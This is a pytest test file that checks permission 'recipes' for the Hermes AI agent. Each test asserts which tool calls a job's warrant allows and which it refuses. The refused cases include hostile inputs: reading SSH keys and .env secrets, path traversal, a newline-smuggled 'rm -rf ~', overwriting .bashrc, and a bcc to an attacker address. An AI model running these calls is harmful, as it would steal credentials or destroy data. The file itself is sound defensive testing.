"""The recipes in recipes/, as shipped: each job's own calls run, and each refusal its page promises holds.

Calls use Hermes' tool names and argument shapes: built-in tools as Hermes
registers them, MCP tools as mcp__<server>__<tool> with the server's own schema,
including the optional arguments models send.
"""
import pytest

pytest.importorskip("tenuo.local_cli.observations", reason="needs the Tenuo SDK with the local CLI (tenuo-ai/tenuo#970)")

import itertools
from pathlib import Path

from tenuo.local_cli.commands import main as tenuo_cli
from tenuo.local_cli.sessions import attach
from tenuo.local_cli.warrants import load_chain
from tenuo.local_cli.workspace import Workspace

from hermes_tenuo import local_guard
from hermes_tenuo.local_guard import SharedLocalGuard

RECIPES = Path(__file__).resolve().parent.parent / "hermes_tenuo" / "recipes"


@pytest.fixture(autouse=True)
def _needs_optional_arguments_and_vars():
    import tenuo
    from tenuo import warrant_template

    if not hasattr(tenuo, "OptionalArg") or not hasattr(warrant_template, "parse_set"):
        pytest.skip("recipes use optional arguments and template vars (tenuo-ai/tenuo#923, #986)")
_ids = itertools.count()


@pytest.fixture
def workspace(tmp_path, monkeypatch):
    monkeypatch.setattr(local_guard, "sender_keys", lambda session_id: [])
    monkeypatch.setattr(local_guard, "parent_session", lambda session_id: None)
    workspace = Workspace(tmp_path / ".tenuo")
    workspace.initialize(dev=True)
    workspace.set_mode("enforce")
    return workspace


# The values a user passes with --set, as each recipe's header shows.
VALUES = {
    "briefing": ["folder=/home/you/briefings"],
    "house-sitter": [],
    "work-on-issues": ["owner=your-org", "repo=your-repo"],
    "review-prs": ["owner=your-org", "repo=your-repo", "prs=[57, 58]"],
    "reply-to-thread": ["me=you@yourco.com", "thread=18f2a9c0d1e2b3a4", "to=bob@vendor.com"],
    "project-task": ["project=/home/you/code/billing"],
}
EXTRA = {"one-issue.yaml": ["issue=412"], "owner.yaml": None}


def issue(workspace, recipe, file="warrant.yaml", *, holder="agent"):
    out = workspace.path.parent / f"{recipe}-{file}.warrant"
    values = [] if EXTRA.get(file, ()) is None else VALUES[recipe] + EXTRA.get(file, [])
    sets = [arg for value in values for arg in ("--set", value)]
    assert tenuo_cli(["--home", str(workspace.path), "--json", "warrant", "issue", "--template",
                      str(RECIPES / recipe / file), "--holder", holder, "--out", str(out), "--replace", *sets]) == 0
    return load_chain(out)


def check(guard, session, calls):
    return [guard.pre_tool_call(tool, args, session_id=session, tool_call_id=f"c{next(_ids)}") is None
            for tool, args in calls]


def test_every_recipe_file_validates(workspace):
    files = sorted(RECIPES.glob("*/*.yaml"))
    assert len(files) >= 8
    for path in files:
        values = [] if EXTRA.get(path.name, ()) is None else VALUES[path.parent.name] + EXTRA.get(path.name, [])
        sets = [arg for value in values for arg in ("--set", value)]
        assert tenuo_cli(["--home", str(workspace.path), "--json", "template", "validate", "--file", str(path),
                          *sets]) == 0, path


def test_a_recipe_says_which_values_it_needs(workspace, capsys):
    import json

    assert tenuo_cli(["--home", str(workspace.path), "--json", "template", "validate", "--file",
                      str(RECIPES / "project-task/warrant.yaml")]) == 1
    assert "--set project=..." in json.loads(capsys.readouterr().out)["error"]


def test_briefing(workspace):
    attach(workspace, "cron_briefing", issue(workspace, "briefing"))  # one attach covers every run of the job
    guard = SharedLocalGuard(workspace.path)
    run = "cron_briefing_20261022_080000"
    assert check(guard, run, [
        ("web_search", {"query": "MCP security news"}),
        ("web_search", {"query": "rust release", "limit": 8}),
        ("web_extract", {"urls": ["https://example.com/a"], "char_limit": 8000}),
        ("read_file", {"path": "/home/you/briefings/2026-10-21.md", "limit": 50}),
        ("write_file", {"path": "/home/you/briefings/2026-10-22.md", "content": "# Briefing"}),
    ]) == [True] * 5
    assert check(guard, run, [
        ("read_file", {"path": "/home/you/.hermes/.env"}),
        ("read_file", {"path": "/home/you/briefings/../.ssh/id_rsa"}),
        ("write_file", {"path": "/home/you/.bashrc", "content": "x"}),
        ("terminal", {"command": "cat ~/.ssh/id_rsa"}),
        ("send_message", {"action": "send", "target": "telegram:666", "message": "hi"}),
        ("mcp__github__push_files", {"owner": "o", "repo": "r", "branch": "main", "files": [], "message": "m"}),
    ]) == [False] * 6


def test_a_cron_run_whose_id_rotated_keeps_its_jobs_warrant(workspace, monkeypatch):
    attach(workspace, "cron_briefing", issue(workspace, "briefing"))
    parents = {"20261022_081500_ab12cd34": "cron_briefing_20261022_080000"}
    monkeypatch.setattr(local_guard, "parent_session", parents.get)
    guard = SharedLocalGuard(workspace.path)
    assert check(guard, "20261022_081500_ab12cd34", [("web_search", {"query": "x"})]) == [True]
    assert check(guard, "20261022_090000_ffffffff", [("web_search", {"query": "x"})]) == [False]


def test_house_sitter_by_person_not_session(workspace, monkeypatch):
    sitter, owner = "telegram:5550001", "telegram:5550002"
    attach(workspace, sitter, issue(workspace, "house-sitter"))
    attach(workspace, owner, issue(workspace, "house-sitter", "owner.yaml"))
    talking = {}
    monkeypatch.setattr(local_guard, "sender_keys", lambda session_id: [talking[session_id]])
    talking.update({"20261021_090000_aaaa1111": sitter, "20261023_120000_bbbb2222": sitter,  # /new: a fresh session
                    "20261021_100000_cccc3333": owner, "20261021_110000_dddd4444": "telegram:5550099"})
    guard = SharedLocalGuard(workspace.path)
    for session in ("20261021_090000_aaaa1111", "20261023_120000_bbbb2222"):
        assert check(guard, session, [
            ("ha_list_entities", {"domain": "light"}),
            ("ha_get_state", {"entity_id": "climate.guest_room"}),
            ("ha_call_service", {"domain": "scene", "service": "turn_on", "entity_id": "scene.guest_room_comfort"}),
            ("ha_call_service", {"domain": "light", "service": "turn_off", "entity_id": "light.guest_room"}),
        ]) == [True] * 4
    assert check(guard, "20261021_090000_aaaa1111", [
        ("ha_call_service", {"domain": "lock", "service": "unlock", "entity_id": "lock.front_door"}),
        ("ha_call_service", {"domain": "light", "service": "turn_on", "entity_id": "light.bedroom"}),
        ("ha_call_service", {"domain": "light", "service": "turn_on", "entity_id": "light.guest_room",
                             "data": '{"area_id": "upstairs"}'}),
        ("ha_get_state", {"entity_id": "alarm_control_panel.home"}),
        ("ha_list_entities", {"domain": "lock"}),
        ("ha_list_entities", {}),  # no domain lists everything, locks and alarms included
    ]) == [False] * 6
    # The owner's own conversation runs on the owner's warrant; someone else gets nothing.
    assert check(guard, "20261021_100000_cccc3333", [
        ("ha_call_service", {"domain": "lock", "service": "unlock", "entity_id": "lock.front_door"})]) == [True]
    blocked = guard.pre_tool_call("ha_get_state", {"entity_id": "light.guest_room"},
                                  session_id="20261021_110000_dddd4444", tool_call_id="x")
    assert "telegram:5550099" in blocked["message"] and "tenuo-cli hermes session attach" in blocked["message"]



def test_task_scope_outranks_sender_across_compression_and_delegation(workspace, monkeypatch):
    """A session given a narrow warrant keeps it in its compressed or delegated
    children, even when the person who sent it holds a broader one."""
    owner = "telegram:5550002"
    attach(workspace, owner, issue(workspace, "house-sitter", "owner.yaml"))
    attach(workspace, "task-session", issue(workspace, "house-sitter"))
    parents = {"child": "task-session"}
    lineage = [f"hop-{n}" for n in range(8)]  # longer than any fixed hop limit
    parents.update(zip(lineage, lineage[1:] + ["task-session"]))
    monkeypatch.setattr(local_guard, "parent_session", parents.get)
    monkeypatch.setattr(local_guard, "sender_keys", lambda session_id: [owner])
    guard = SharedLocalGuard(workspace.path)
    unlock = ("ha_call_service", {"domain": "lock", "service": "unlock", "entity_id": "lock.front_door"})
    for session in ("child", "hop-0"):
        assert check(guard, session, [("ha_get_state", {"entity_id": "climate.guest_room"}), unlock]) == [True, False]
    # With no task attachment anywhere in its lineage, the sender's warrant applies.
    assert check(guard, "fresh-chat", [unlock]) == [True]


GH = {"owner": "your-org", "repo": "your-repo"}
P = "mcp__github__"


def test_work_on_issues(workspace):
    attach(workspace, "chat", issue(workspace, "work-on-issues"))
    guard = SharedLocalGuard(workspace.path)
    assert check(guard, "chat", [
        (P + "issue_read", {"method": "get", **GH, "issue_number": 412}),
        (P + "issue_read", {"method": "get_comments", **GH, "issue_number": 412, "perPage": 30}),
        (P + "get_file_contents", {**GH, "path": "billing/invoice.py"}),
        (P + "get_file_contents", {**GH, "path": "billing/invoice.py", "ref": "agent/issue-412"}),
        (P + "create_branch", {**GH, "branch": "agent/issue-412"}),
        (P + "create_branch", {**GH, "branch": "agent/issue-413", "from_branch": "main"}),
        (P + "push_files", {**GH, "branch": "agent/issue-412", "message": "Fix rounding",
                            "files": [{"path": "billing/invoice.py", "content": "..."}]}),
        (P + "create_pull_request", {**GH, "title": "Fix #412", "head": "agent/issue-412", "base": "main",
                                     "body": "Fixes #412", "draft": True}),
        (P + "add_issue_comment", {**GH, "issue_number": 412, "body": "Opened a PR."}),
    ]) == [True] * 9
    assert check(guard, "chat", [
        (P + "push_files", {**GH, "branch": "main", "message": "m", "files": []}),
        (P + "create_branch", {**GH, "branch": "release-1", "from_branch": "main"}),
        (P + "create_pull_request", {**GH, "title": "t", "head": "agent/x", "base": "release"}),
        (P + "merge_pull_request", {**GH, "pullNumber": 57}),
        (P + "get_file_contents", {"owner": "your-org", "repo": "private-payroll", "path": "salaries.csv"}),
        (P + "issue_write", {"method": "update", **GH, "issue_number": 412, "state": "closed"}),
        (P + "pull_request_review_write", {"method": "create", "event": "COMMENT", **GH, "pullNumber": 1, "body": "x"}),
    ]) == [False] * 7


def test_one_issue(workspace):
    attach(workspace, "chat", issue(workspace, "work-on-issues", "one-issue.yaml"))
    guard = SharedLocalGuard(workspace.path)
    assert check(guard, "chat", [
        (P + "issue_read", {"method": "get", **GH, "issue_number": 412}),
        (P + "push_files", {**GH, "branch": "agent/issue-412", "message": "m", "files": []}),
    ]) == [True, True]
    assert check(guard, "chat", [
        (P + "issue_read", {"method": "get", **GH, "issue_number": 413}),
        (P + "push_files", {**GH, "branch": "agent/issue-413", "message": "m", "files": []}),
    ]) == [False, False]


def test_review_prs_held_by_the_reviewer_key(workspace):
    assert tenuo_cli(["--home", str(workspace.path), "--json", "key", "new", "reviewer"]) == 0
    attach(workspace, "reviewer-chat", issue(workspace, "review-prs", holder="reviewer"), holder="reviewer")
    reviewer = SharedLocalGuard(workspace.path, key="reviewer")
    assert check(reviewer, "reviewer-chat", [
        (P + "pull_request_read", {"method": "get_diff", **GH, "pullNumber": 57}),
        (P + "pull_request_read", {"method": "get_files", **GH, "pullNumber": 58, "perPage": 100}),
        (P + "pull_request_read", {"method": "get_review_comments", **GH, "pullNumber": 58, "after": "Y3Vyc29y"}),
        (P + "pull_request_review_write", {"method": "create", "event": "COMMENT", **GH, "pullNumber": 57,
                                           "body": "Looks right.", "commitID": "abc123"}),
    ]) == [True] * 4
    assert check(reviewer, "reviewer-chat", [
        (P + "pull_request_review_write", {"method": "create", "event": "APPROVE", **GH, "pullNumber": 57, "body": "x"}),
        (P + "pull_request_read", {"method": "get", **GH, "pullNumber": 59}),
        (P + "push_files", {**GH, "branch": "agent/issue-412", "message": "m", "files": []}),
    ]) == [False] * 3
    # The same warrant in the agent key's conversation is refused: it's bound to the reviewer's key.
    agent = SharedLocalGuard(workspace.path)
    attach(workspace, "agent-chat", issue(workspace, "review-prs", holder="reviewer"), holder="reviewer")
    assert check(agent, "agent-chat", [(P + "pull_request_read", {"method": "get", **GH, "pullNumber": 57})]) == [False]


def test_reply_to_thread(workspace):
    gw = "mcp__google_workspace__"
    me, thread = {"user_google_email": "you@yourco.com"}, {"thread_id": "18f2a9c0d1e2b3a4"}
    attach(workspace, "chat", issue(workspace, "reply-to-thread"))
    guard = SharedLocalGuard(workspace.path)
    assert check(guard, "chat", [
        (gw + "get_gmail_thread_content", {**me, **thread}),
        (gw + "send_gmail_message", {**me, **thread, "to": "bob@vendor.com", "subject": "Re: invoice",
                                     "body": "Paid today.", "in_reply_to": "<a@b>", "references": "<a@b>"}),
    ]) == [True, True]
    assert check(guard, "chat", [
        (gw + "send_gmail_message", {**me, **thread, "to": "someone@else.com", "subject": "x", "body": "x"}),
        (gw + "send_gmail_message", {**me, **thread, "to": "bob@vendor.com", "subject": "x", "body": "x",
                                     "bcc": "attacker@evil.com"}),
        (gw + "send_gmail_message", {**me, **thread, "to": "bob@vendor.com", "subject": "x", "body": "x",
                                     "forward_message_id": "m1"}),
        (gw + "send_gmail_message", {**me, "thread_id": "other", "to": "bob@vendor.com", "subject": "x", "body": "x"}),
        (gw + "get_gmail_thread_content", {**me, "thread_id": "other"}),
        (gw + "search_gmail_messages", {**me, "query": "password reset"}),
    ]) == [False] * 6


def test_project_task(workspace):
    project = "/home/you/code/billing"
    attach(workspace, "chat", issue(workspace, "project-task"))
    guard = SharedLocalGuard(workspace.path)
    assert check(guard, "chat", [
        ("read_file", {"path": f"{project}/billing/invoice.py", "offset": 1, "limit": 200}),
        ("search_files", {"pattern": "round(", "path": project, "target": "content", "file_glob": "*.py"}),
        ("patch", {"mode": "replace", "path": f"{project}/billing/invoice.py", "old_string": "a", "new_string": "b"}),
        ("terminal", {"command": "pytest -q", "workdir": project, "timeout": 300}),
        ("terminal", {"command": "git diff", "workdir": f"{project}/"}),
    ]) == [True] * 5
    assert check(guard, "chat", [
        ("read_file", {"path": "/home/you/.ssh/id_rsa"}),
        ("read_file", {"path": f"{project}/../../.hermes/.env"}),
        ("terminal", {"command": "git status \nrm -rf ~", "workdir": project}),
        ("terminal", {"command": "git diff --output=/home/you/.bashrc", "workdir": project}),
        ("terminal", {"command": "pytest -q -p evil", "workdir": project}),
        ("terminal", {"command": "pytest -q", "workdir": "/"}),
        ("terminal", {"command": "pytest -q", "workdir": project, "background": True}),
        ("write_file", {"path": "/home/you/.bashrc", "content": "x"}),
    ]) == [False] * 8
